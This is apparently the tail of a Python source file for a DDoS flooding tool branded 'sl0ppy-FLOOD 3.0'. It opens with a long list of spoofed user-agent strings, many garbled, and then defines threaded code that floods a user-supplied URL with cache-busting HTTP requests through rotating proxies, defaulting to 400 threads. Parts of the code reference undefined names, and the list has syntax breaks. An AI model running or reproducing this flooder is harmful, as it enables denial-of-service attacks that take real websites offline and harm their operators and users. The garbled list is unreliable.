	"bwh3_user_agent",
	"/Nutch-0.9 Amfibis web- ; ://www.amfibi.com//; @amfibi.com",
	"/Nutch-1.0-dev Amfibis web- ; ://www.amfibi.com//; @amfibi.com",
	"CamelHttpStream/1.0"
	"Cancer    International;",
	"/1.0",
	"Carnegie_Mellon_University_Research_WebBOT-->PLEASE READ-->:///~//index.html :///~//index.html",
	"Carnegie_Mellon_University_WebCrawler :///~//index.html",
	"Catall Spider",
	"/-0.1  Crawler; ://.com/; @.com",
	"/1.0 +:///.html",
	"/x.x",
	"CDR/1.7.1 Simulator/0.7+:// /MIDP-1.0 /CLDC-1.0",
	"CE-"
	" - investigator",
	"/3.0 ://-",
	"Ceramic    ://.com",
	"CERN-/2.15",
	"cfetch/1.0",
	"CFNetwork/x.x",
	"- ",
	"/1.x ",
	" Catcher/1.0",
	"/1.xx LWP/5.xx",
	"CheckLinks/1.x.x",
	"CheckUrl",
	"CheckWeb",
	"/1.0.0 +://.com/",
	" Local  2.6",
	"  1.0",
	"ChristCRAWLER 2.0",
	" by   ",
	" ://.com/.html",
	"Cityreview  +:///crawler/",
	"CJ Spider/"
	"CJB.NET Proxy",
	"/1.0",
	".com",
	"/0.9 +://.seznam.cz/",
	"/2.x +://www.clush.com/.html",
	"/3.x-BinaryFury +://www.clush.com/.html",
	"/3.xx-Ajax +://www.clush.com/.html",
	"/3.xx-Hector +://www.clush.com/.html",
	"/3.xx-Peleus +://www.clush.com/.html",
	"COAST WebMaster Pro/4.x.x.xx Windows NT",
	"Cocoal.icio.us/1.0 v36 Mac OS X; ://www.scifihifi.com/cocoalicious",
	"/1.X +://www.cogentsoftwaresolutions.com/.html",
	" BookmarkTracker.com",
	".cgi/1.xx",
	"/0.0",
	"/2.0 :///",
	"/3 :///",
	"/x.0",
	"cometrics- ://",
	" Browser Center",
	"complex_network_group/Nutch-0.9-dev    of  --web; :///~networks/crawl; nimakhaj@gmail.com",
	"Computer_and_Automation_Research_Institute_Crawler crawler@",
	"/0.7.1 Nutch; :///nutch/.html; nutch-@",
	"/0.2",
	"ContentSmartz",
	"  Spider V6.x",
	"ConveraCrawler/0.2",
	"ConveraCrawler/ +://www.authoritativeweb.com/crawl",
	"ConveraMultiMediaCrawler/0.1 +://www.authoritativeweb.com/crawl",
	"Cooliris/1.5 CFNetwork/459 /10.0.0d3",
	"CoralWebPrx/0.1.1x  :///" ,
	"cosmos/0.8_@.com",
	"cosmos/0.9_@.com",
	"CoteoNutchCrawler/Nutch-0.9 info [] coteo [] com",
	"CougarSearch/0.x +://www.cougarsearch.com/faq.shtml",
	"Covac TexAs ",,
	"%203/3.0.1 CFNetwork/339.5 /9.5.0 i386 iMac51",
	"-0.1 NHN . / +82-2-3011-1954 / @naver.com",
	"-0.1.x NHN . / +82-2-3011-1954 / @naver.com",
	"CrawlConvera0.1 @yahoo.com",
	"Crawler",
	"Crawler cometsearch@cometsystems.com",
	"Crawler @",
	"Crawler V 0.2.x @",
	"crawler@.com",
	"CrawlerBoy .com",
	"/0.1 ; +://www.crawlly.com; crawler@crawlly.com",
	"CreativeCommons/0.06-dev Nutch; :///docs//.html; nutch-@",
	"-A100/1.0 UP.Browser/6.3.0.7 GUI MMP/2.0",
	"CrocCrawler vx.3 [] ://www.croccrawler.com X11; I; Linux 2.0.44 i686",
	"csci_b659/0.13",
	"CSE HTML Validator Professional ://www.htmlvalidator.com/",
	"Cuam Ver0.050bx",
	"/0.9b ://www.cuasar.com/spider_beta/",
	"curl/7.10.x i386--linux- libcurl/7.10.x OpenSSL/ ipv6 zlib/1.1.4",
	"curl/7.7.x i386--freebsd4.3 libcurl 7.7.x SSL 0.9.6 ipv6 ",
	"curl/7.8 i686-pc-linux- libcurl 7.8 OpenSSL 0.9.6",
	"curl/7.9.x win32 libcurl 7.9.x",
	"  1.1",
	"Custo x.x .com",
	"Custom Spider www.bisnisseek.com /1.0",
	"/2.0 Macintosh; 68k",
	"CyberPatrol  ",
	"CyberSpyder Link /2.1.12",
	"CydralSpider/1.x",
	"CydralSpider/3.0",
	"DA 3.5",
	"DA 4.0",
	"DA 4.0",
	"DA 5.0",
	"DA 7.0",
	"DAP x.x",
	" Communications PowerTCP",
	"DataCha0s/2.0",
	"DataCha0s/2.0",
	"DataFountains/DMOZ Downloader",
	"DataFountains/Dmoz Downloader :///useragents.shtml",
	"DataFountains/DMOZ  Vector Corpus Creator :///useragents.shtml",
	"DataparkSearch/4.47 +:///"
	"DataparkSearch/4.xx :///",
	"DataSpear/1.0 Spider; ://www.dataspear.com/spider.html; spider@dataspear.com",
	"/0.2 DataSpear Spider ; ://dssb.dataspear.com/.html; dssb@dataspear.com",
	" ://www.sicher-durchs-/.html",
	"/1.7",
	"/0.x",
	"://.com",
	" 1.4b",
	"DC-/x.xx",
	"/1.1",
	"DDD",
	"dds explorer v1.0 ",
	" 1.2 ://.com/spider",
	"DeadLinkCheck/0.4.0 libwww-perl/5.xx",
	" Link Calculator v1.0",
	"deepak-USC/ISI",
	"DeepIndex",
	"DeepIndex  ://.com ",
	"DeepIndex .deepindex.com",
	"del.icio.us-thumbnails/1.0 /5.0 ; Konqueror/3.4; FreeBSD KHTML/3.4.2  Gecko",
	"/9.0.5-fix1",
	"Demo  DOT 16b",
	"Demo  Z 16b",
	"Denmex websearch ://search.denmex.com",
	"dev-spider2.searchpsider.com/1.3b",
	"DevComponents.com  ",
	"DiaGem/1.1 :///diagem.html",
	"/x.0",
	"",
	"Digger/1.0 JDK/1.3.0rc3",
	"DigOut4U",
	"/1.2",
	"Dillo/0.8.5--misc",
	"Dillo/0.x.x",
	"disastrous/1.0.5  with  2.5.1; :///disastrous.html; archangel77@del.icio.us",
	"DISCo  x.x",
	"disco/Nutch-0.9 experimental crawler; .com; disco-crawl@.com",
	"disco/Nutch-1.0-dev experimental crawler; .com; disco-crawl@.com",
	"DittoSpyder",
	"dloader/1.0",
	".com  Link Ckeck Tool.   to: dnsr@.com",
	"DoCoMo/1.0/Nxxxi/c10",
	"DoCoMo/1.0/Nxxxi/c10/TB",
	"DoCoMo/1.0/P502i/c10  CHTML Proxy/1.0",
	"DoCoMo/2.0 P900iVc100;TB;W24H11",
	"DoCoMo/2.0 SH901iSc100;TB;W24H12  .com",
	"DoCoMo/2.0 SH902i ; Y!J-SRD/1.0; ://///search//-27.html",
	"DoCoMo/2.0/SO502i ; Y!J-SRD/1.0; ://///search//-27.html",
	"/1.0 Windows; U; WinNT4.0; -US; rv:1.0.0 Gecko/20020804",
	"/experimental"
	"DonutP; Windows98SE",
	"/1.0 @.com ://.com",
	" /3.x.x.x",
	"  2.x",
	" Express 1.0",
	" Master",
	"  3.0",
	" Wonder",
	"- Linkcheck ://-/",
	"1.1 +://www.sql--/-tools/",
	".1.0",
	"Dr.Web R  scanner: ://.drweb.com/",
	"Dragonfly  Reader",
	"/1.0 :///.html",
	"Drupal +:///",
	" 01",
	" 71",
	" 81",
	" VA",
	"dtSearchSpider",
	"Dual Proxy",
	"/1.0; +://duckduckgo.com/.html",
	" 0.1  - .com",
	" 0.1  - ://.com/.html",
	" 0.1 ",
	"- 1.0 www.vigiltech.com/esensedisclaim.html",
	"-:///~/es/",
	"/2.0 ; heritrix/2.0.0-SNAPSHOT-20071024.170148 +://www.eapollo-opto.com",
	"EARTHCOM.info/1.x [www.earthcom.info]",
	"EARTHCOM.info/ [www.earthcom.info]",
	"EasyDL/3.xx",
	"EasyDL/3.xx ://.com//",
	" 1.4b",
	"eCatch/3.0",
	"EchO!/2.0",
	" Search VxB",
	"egothor/ +:///.html",
	"/4.8 +://www.egoto.com/.htm",
	"ejupiter.com",
	"EldoS TimelyWeb/3.x",
	"/1.0 +:///crawler//",
	"ELI/20070402:2.0 DAUM RSS  Daum Communications .; +:///aboutkr.html",
	"ELinks 0.x.x; Linux 2.4.20 i586; 132x60",
	"ELinks/0.x.x ; NetBSD 1.6.2 sparc; 132x43",
	"EmailSpider",
	"EmailWolf 1.00",
	".com ",
	".com  ://.com/.aspx",
	"EMPAS_ROBOT",
	"/1.x ://www.enaball.com/crawler.html",
	"endo/1.0 Mac OS X; ppc i386; :///endo",
	"Enfish Tracker",
	"Enterprise_Search/1.0",
	"Enterprise_Search/1.0.xxx",
	"Enterprise_Search/1.00.xxx;MSSQL :///es-",
	"envolk/1.7 +://www.envolk.com/",
	"envolk[ITS]spider/1.6+://www.envolk.com/envolkspider.html",
	"EroCrawler",
	"ES.NET_Crawler/2.0 :///",
	"eseek-larbin_2.6.2 crawler@exactseek.com",
	"ESISmartSpider",
	"eStyleSearch 4 ; MSIE 6.0; Windows NT 5.0",
	" 15",
	"/0.x +://.com ",
	"/0.x +://.com GetRobots",
	"/0.x +://.com PreCheck",
	"/1.0 ://",
	"EvaalSE - @evaal.com",
	"eventax/1.3 eventax; :///; info@",
	"- Inc./0.1 R&D ; =-1-24; ://.com/",
	"- Inc./0.1 R&D ; ://.com/",
	"-Images/1.0",
	"-/1.0",
	"/2.0",
	"/3.0",
	"ExactSearch",
	"ExactSeek Crawler/0.1",
	"exactseek-crawler-2.63 crawler@exactseek.com",
	"exactseek-pagereaper-2.63 crawler@exactseek.com",
	"exactseek.com",
	" NG/  //0.120",
	"Excalibur  Spider V6.5.4",
	"Execrawl/1.0 Execrawl; ://www.execrawl.com/; @execrawl.com",
	" crawler/ crawler crawler for .com; ://.com/; info    com",
	"/ crawler ; ",
	"  Sleuth",
	"Express WebPictures www.express-.com",
	"ExtractorPro",
	"  Finder",
	"EyeCatcher -/1.0",
	" 1.09  ://www.factbites.com/",
	" : ://www.factbites.com/robots",
	"/2.0.x",
	"FANGCrawl/0.01",
	"FARK.com link verifier",
	" Crawler  ",
	"FAST  Crawler 6 Experimental",
	"FAST  Crawler 6 / Scirus scirus-crawler@.no; ://www.scirus.com//contactus/",
	"FAST  Crawler 6  by   @fastsearch.com",
	"FAST  Crawler 6  by Comperio AS sts@comperio.no",
	"FAST  Crawler 6  by FAST FAST",
	"FAST  Crawler 6  by Pages Jaunes @pagesjaunes.fr",
	"FAST  Crawler 6  by  Web Crawler search_comments\\sensis\\com\\",
	"FAST  Crawler 6  by  Press Holdings crawler@"
	"FAST  Crawler 6  by WWU wardi@uni-",
	"FAST  Crawler/6 www.fastsearch.com",
	"FAST  Crawler/6.4 helpdesk  .no",
	"FAST  retriever ; MSIE 5.5; /4.0",
	"FAST MetaWeb Crawler helpdesk  fastsearch  com",
	"  Crawler",
	"FAST-WebCrawler/2.2.10  Search crawler@.no; ://.no/faq/faqfastwebsearch/faqfastwebcrawler.html",
	"FAST-WebCrawler/2.2.6 crawler@.no; ://.no/faq/faqfastwebsearch/faqfastwebcrawler.html",
	"FAST-WebCrawler/2.2.7 crawler@.no; ://.no/faq/faqfastwebsearch/faqfastwebcrawler.html://.no",
	"FAST-WebCrawler/2.2.8 crawler@.no; ://.no/faq/faqfastwebsearch/faqfastwebcrawler.html://.no",
	"FAST-WebCrawler/3.2 ",
	"FAST-WebCrawler/3.3 crawler@.no; ://.no/?c=faqs/crawler",
	"FAST-WebCrawler/3.4/ crawler@.no; ://.no/?c=faqs/crawler",
	"FAST-WebCrawler/3.4/ crawler@.no; ://.no/?c=faqs/crawler",
	"FAST-WebCrawler/3.5 atw-crawler    no; ://.no/?c=faqs/crawler",
	"FAST-WebCrawler/3.6 atw-crawler    no; ://.no//",
	"FAST-WebCrawler/3.6/ crawler@.no; ://.no/?c=faqs/crawler",
	"FAST-WebCrawler/3.7 atw-crawler    no; ://.no//",
	"FAST-WebCrawler/3.7/ atw-crawler    no;://.no//",
	"FAST-WebCrawler/3.8 atw-crawler    no; ://.no//",
	"FAST-WebCrawler/3.8/Fresh atw-crawler    no; ://.no//",
	"FAST-WebCrawler/3.x ",
	"FAST-WebCrawler/3.x  mm dash crawler    no",
	" crawler  2.0 +://",
	" ://www.ay-.com",
	"FastCrawler 3.0.1 crawler@1klik.dk",
	"FastSearch Web Crawler for  SuperPages .watters@fastsearch.com",
	"Favcollector/2.0 info@favcollector.com ://www.favcollector.com/",
	"FavIconizer",
	" crawler/0.6 ://",
	"Favorites  ://",
	"Favorites Sweeper v.2.03",
	"/1.0",
	"FDM 1.x",
	"FDM 2.x",
	" Seeker  RSS  Seeker ://.com/",
	"Feed24.com",
	"::/0.0x",
	"/0.1 ; MSIE 6.0; Windows NT 5.1",
	"FeedChecker/0.01",
	"/2.7 ://www.newsgator.com/;  Windows XP",
	"Feedfetcher--iGoogleGadgets; +://.com/feedfetcher.html",
	"Feedfetcher-; +://.com/feedfetcher.html",
	"FeedForAll  v2",
	"FeedHub FeedDiscovery/1.0 ://www.feedhub.com",
	"FeedHub MetaDataFetcher/1.0 ://www.feedhub.com",
	"  Crawler 1.0",
	"Feedreader 3.xx  by ",
	"Feedshow/x.0 ://www.feedshow.com; 1 subscriber",
	" ://www.feedshow.com",
	"FeedZcollector v1.x Platinum ://www.feeds4all.com/feedzcollector",
	"Felix -  Crawler +://.com"
	"fetch libfetch/2.0",
	"FFC  Door Spider",
	"Filangy/0.01- Filangy; :///docs//.html; filangy-@filangy.com",
	"Filangy/1.0x Filangy; ://www.filangy.com/?inc=; filangy-@filangy.com",
	"Filangy/1.0x Filangy; :///docs//.html; filangy-@filangy.com",
	"/1.0 +://",
	" x.x",
	"Filtrbox/1.0",
	"FindAnISP.com_ISP_Finder_v99a",
	" Crawler ://.no/gulesider/",
	"findlinks/x.xxx +://wortschatz.uni-/findlinks/",
	"-prefetch"
	"Firefly/1.0",
	"Firefly/1.0 ;  4.0; MSIE 5.5",
	"Firefox kastaneta03@hotmail.com",
	"Firefox_1.0.6 kasparek@naparek.cz",
	"FirstGov.gov Search - POC:firstgov.webmasters@.gov",
	"/0.7.2 Flaptor Crawler; ://www.flaptor.com; crawler  flaptor  com",
	"FLATARTS_FAVICO",
	"Flexum spider",
	"Flexum/2.0",
	" 2.0 RPT-/0.3-3",
	"flunky",
	"fly/6.01 libwww/4.0D",
	" 1.0/://",
	"/2.5.2 +://.com/addurl.html",
	"FocusedSampler/1.0",
	".com Spider/0.1  1 .com",
	"   ://.com/.html ",
	".com  ://.com/b.html ",
	"Fooky.com//; ://www.fooky.com/scorpionbots",
	"Francis/1.0 francis@ :///",
	" Locator 1.8",
	"- -link validator /0.1",
	".com-/1.0 ://.com; spiderinfo@.com",
	"/1.0 +://www.frelic.com/",
	"/x.xx",
	"FreshNotes crawler<  problems to crawler--freshnotes--com",
	" 01",
	"FTB- ://.co.uk/",
	"Full Web  0416B",
	"Full Web  0516B",
	"Full Web  2816B",
	"FuseBulb.Com",
	"/5.0 Windows; U; Windows NT 6.1; -US /534.3 KHTML,  Gecko BlackHawk/1.0.195.0 /127.0.0.1 Safari/62439616.534",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0  4 1.52 /536.26 KHTML,  Gecko",
	"/5.0 Windows NT 6.1; rv:26.0 Gecko/20100101 Firefox/26.0 /26.0.0.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"/4.0 ; MSIE 6.1; Windows XP",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"	        			
			]
			
class Spammer(threading.Thread):
    def __init__(self, url, number, lista):
        threading.Thread.__init__(self)
        self.url = url + "?" + str(random.randint(0,9999)) + "=" + str(random.randint(0,9999))
        self.num = number
        self.headers = self.headers = {
                'User-Agent': random.choice(ua),
                'Referer': random.choice(ref),
                'Accept-Encoding': 'gzip;q=0,deflate;q=0',
                'Connection': 'Keep-Alive',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Cache-directive': 'no-cache',
                'Pragma': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
            }
        self.Lock = threading.Lock()
        self.lista = lista
    def request(self):
        global N
        data = None
        if N >= (len(self.lista) - 1):
            N = 0
        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener) 
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        print(Fore.RED + "0000000000000000000000000000")
        print(Fore.YELLOW + "DDos, By Team sl0ppyr00t!!")
        print(Fore.RED + "0000000000000000000000000000")
        sys.stdout.write("Thread #%4d | %4d\%d | Proxy@%s"%(self.num, N, len(self.lista), self.lista[N]))
    def run(self):
        global N
        self.Lock.acquire()
        print ("Thread #%4d |"% (self.num))
        self.Lock.release()
        time.sleep(1)
        while True:
            try:
                N += 1
                self.request()
            except:
                pass
        sys.exit(0)
def title():
    stdout.write("                                                                                          \n")
    stdout.write("             "+"+0000000000000000000000000000000000000000000000000000000+\n")
    stdout.write("             "+"0             sl0ppy-FLOOD 3.0              ""          0\n")
    stdout.write("             "+"0        ADDED NEW METHOD AND BYPASS    ""              0\n")
    stdout.write("             "+"0        ADDED NEW UA + Custom UA           ""          0\n")
    stdout.write("             "+"+0000000000000000000000000000000000000000000000000000000+\n")
    stdout.write("\n")

class MainLoop():
    
    def __init__(self):
        if os.name in ("nt", "dos", "ce"):
            title()
    def check_url(self, url):
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "https://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "https://" + url
        return url

    def setup(self):
        global Close, Request, Tot_req
        while True:        
            print(Fore.RED + "0000000000000000000000000000")
            print(Fore.YELLOW + "     We Proudly Present   ")
            print(Fore.YELLOW + "     sl0ppy-FLOOD 3.0     ")
            print(Fore.YELLOW + "                          ")
            print(Fore.YELLOW + "     Auth : p.hoogeveen   ")
            print(Fore.YELLOW + "     AKA  : x0xr00t       ")
            print(Fore.YELLOW + "     Team : Sl0ppyr00t    ")
            print(Fore.RED + "0000000000000000000000000000")
            print(Style.RESET_ALL)
            url = input('> Enter Url to DoS: ')
            url = self.check_url(url)
            try:
                req = urllib.request.Request(url, None, {'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'})
                response = urllib.request.urlopen(req)
                break
            except:
                print ('> Could not open specified url.')
        while True:            
            try:
                l = str(input('> Enter the list of proxy: '))
                in_file = open(l,"r")
                lista = []
                for i in in_file:
                    lista.append(i.split("/n")[0])
                break
            except:
                print ('Error to read file.')
        while True:                
            try:
                num_threads = int(input('> Enter the number of thread [400]: '))
            except:
                num_threads = 400
            break

        for i in range(num_threads):
            Spammer(url, i + 1, lista).start()
        
if __name__ == '__main__':
    N = 0
    b = MainLoop()
    b.setup()
